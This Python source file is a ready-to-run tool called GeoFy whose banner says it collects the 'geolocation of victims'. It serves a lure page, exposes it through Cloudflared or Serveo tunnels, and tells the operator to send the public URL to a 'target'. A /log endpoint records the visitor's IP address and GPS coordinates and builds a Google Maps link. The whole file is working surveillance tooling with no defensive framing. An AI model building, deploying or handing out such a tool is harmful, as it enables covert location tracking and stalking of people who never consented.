import http.server
import socketserver
import os
import subprocess
import sys
import json
import threading
import re
import shutil


PORT = 8000
DIRECTORY = "./template"

class GeoFyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == "/":
                self.path = "index.html"
            return super().do_GET()
        except ConnectionAbortedError:
            print("[ERROR] Client disconnected from the Server.")
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")

    def do_POST(self):
        response_status = 404
        response_text = 'Invalid Endpoint.'

        if self.path == "/log":
            content_length = int(self.headers['Content-Length'])
            body = json.loads(self.rfile.read(content_length))

            ip = body["ip"]
            latitude = body["geolocation"]["latitude"]
            longitude = body["geolocation"]["longitude"]

            print(f"IP Address: {ip}\nGeolocation: {latitude}, {longitude}")

            gmap_url = get_google_map(latitude=latitude, longitude=longitude)            
            print(f"Google Map: {gmap_url}")

            response_status = 200
            response_text = 'Data Received Successfully.'

        self.send_response(response_status)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(response_text.encode("utf-8"))

    def log_message(self, format, *args):
        pass


def get_google_map(latitude, longitude):
    url = f"https://www.google.com/maps?q={latitude},{longitude}"
    return url


def start_serveo():
    try:
        print("Starting Serveo Tunnel...")
        tunnel_process = subprocess.Popen(
            ["ssh", "-R", f"80:localhost:{PORT}", "serveo.net"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        while True:
            line = tunnel_process.stdout.readline()
            if not line:
                break

            url = re.search(r"https://[a-zA-Z0-9-]+\.serveo\.net", line)
            if url:
                print(f"🌍 Your Public URL is: {url.group(0)}", flush=True)
                print("🔗 Send this URL to your target to get their geolocation.")
                return url.group(0)
            
        print("[ERROR] Failed to get Serveo URL. Check if Serveo is running properly.")
        return None
    
    except Exception as e:
        print(f"[ERROR] Unexpected issue while starting Serveo: {e}")
        return None


def start_cloudflared():
    try:
        print("Starting Cloudflared Tunnel...")

        tunnel_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        while True:
            line = tunnel_process.stdout.readline()
            if not line:
                break

            url = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if url:
                print(f"🌍 Your Public URL is: {url.group(0)}", flush=True)
                print("🔗 Send this URL to your target to get their geolocation.")
                return url.group(0)

        print("[ERROR] Failed to get Cloudflared URL. Check if Cloudflared is running properly.")
        return None
    
    except FileNotFoundError:
        print("[ERROR] Cloudflared is not installed. Please install it and try again.")
        return None
    except Exception as e:
        print(f"[ERROR] Unexpected issue while starting Cloudflared: {e}")
        return None


def serve_template():
    os.chdir(DIRECTORY)
    with socketserver.TCPServer(("", PORT), GeoFyHandler) as httpd:
        print(f"Serving at port {PORT}")
        print("Server started at http://localhost:8000")
        httpd.serve_forever()


def handle_tunnel_choice():
    print("\nTunnel Providers:")
    print("\t1. Localhost")
    print("\t2. Cloudflare")
    print("\t3. Serveo")

    choice = input("\nChoose a Tunnel Provider: ")

    match choice:
        case "1":
            serve_template()
        case "2":
            server_thread = threading.Thread(target=serve_template)
            tunnel_thread = threading.Thread(target=start_cloudflared)
            server_thread.start()
            tunnel_thread.start()
            server_thread.join()
            tunnel_thread.join()
        case "3":
            server_thread = threading.Thread(target=serve_template)
            tunnel_thread = threading.Thread(target=start_serveo)
            server_thread.start()
            tunnel_thread.start()
            server_thread.join()
            tunnel_thread.join()
        case _:
            print("Invalid choice. Please try again.")


def exit_program():
    print('Exiting the tool. Goodbye!')
    sys.exit()


def handle_choice(choice):
    match choice:
        case "1":
            handle_tunnel_choice()
        case "2":
            exit_program()
        case _:
            print("Invalid choice. Please try again.")


def print_options():
    print("\nOptions:")
    print("\t1. Use Default Template (Most Accurate)")
    print("\t2. Exit")
    return input("\nChoose an option: ")


def print_ascii_art():
    ascii_art = r"""
   _____ ______ ____  ________     __
  / ____|  ____/ __ \|  ____\ \   / /
 | |  __| |__ | |  | | |__   \ \_/ / 
 | | |_ |  __|| |  | |  __|   \   /  
 | |__| | |___| |__| | |       | |   
  \_____|______\____/|_|       |_|   
    """
    print(ascii_art)
    print("Welcome To GeoFy")
    print("------------------------------------------------------")
    print("This tool helps you collect geolocation of victims.")
    print("Please follow the instructions below to get started.")
    print("------------------------------------------------------")


def is_installed(command):
    return shutil.which(command) is not None


def install_cloudflared():
    print("[INFO] Installing Cloudflared...")

    if sys.platform.startswith("win"):
        os.system("curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -o cloudflared.exe")
        os.system("move cloudflared.exe C:\\Windows\\System32\\cloudflared.exe")
    elif sys.platform.startswith("linux"):
        os.system("wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared")
        os.system("chmod +x /usr/local/bin/cloudflared")
    elif sys.platform.startswith("darwin"):
        os.system("brew install cloudflared")
    print("[SUCCESS] Cloudflared installed.")


def install_ssh():
    print("[INFO] Installing SSH...")

    if sys.platform.startswith("win"):
        os.system("powershell -Command \"Add-WindowsFeature -Name OpenSSH.Server\"")
    elif sys.platform.startswith("linux"):
        os.system("sudo apt install -y openssh-client")
    elif sys.platform.startswith("darwin"):
        os.system("brew install openssh")
    print("[SUCCESS] SSH installed.")


def ensure_dependencies():
    if not is_installed("cloudflared"):
        install_cloudflared()
    if not is_installed("ssh"):
        install_ssh()


if __name__ == "__main__":
    ensure_dependencies()
    print_ascii_art()
    while True:
        choice = print_options()
        handle_choice(choice)
